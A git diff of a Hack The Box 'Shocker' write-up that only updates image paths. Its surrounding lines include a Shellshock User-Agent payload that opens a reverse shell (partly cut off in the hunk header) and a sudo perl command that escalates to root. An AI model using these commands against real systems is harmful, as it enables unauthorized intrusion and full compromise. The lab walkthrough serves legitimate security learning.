@@ -118,7 +118,7 @@ curl -H "User-Agent: () { :; }; /bin/bash -c 'rm -f /tmp/f;mkfifo /tmp/f;cat /tm
 
 And it worked, I now have a rev shell running as the user `shelly`
 
-![[revshell.png]]
+![[htb/easy/shocker/revshell.png]]
 
 After stabilizing the shell, I started my Privilege Escalation routine. `sudo -l` revealed that shelly is allowed to run `/usr/bin/perl` as root, hence gaining root access is very stratightforward here. 
 
@@ -127,7 +127,7 @@ The working payload to gain a root shell is:
 sudo perl -e 'exec "/bin/sh"'
 ```
 
-![[root.png]]
+![[htb/easy/shocker/root.png]]
 
 ### Conclusion
 `Shocker` is a straightforward, beginner-friendly Box. It emphasizes more on gaining initial acces than on the Privilege Escalation part. If someone is not familiar with shellshock, this part can be a little tricky, as one first needs to find out how this actually works and what payloads to send.
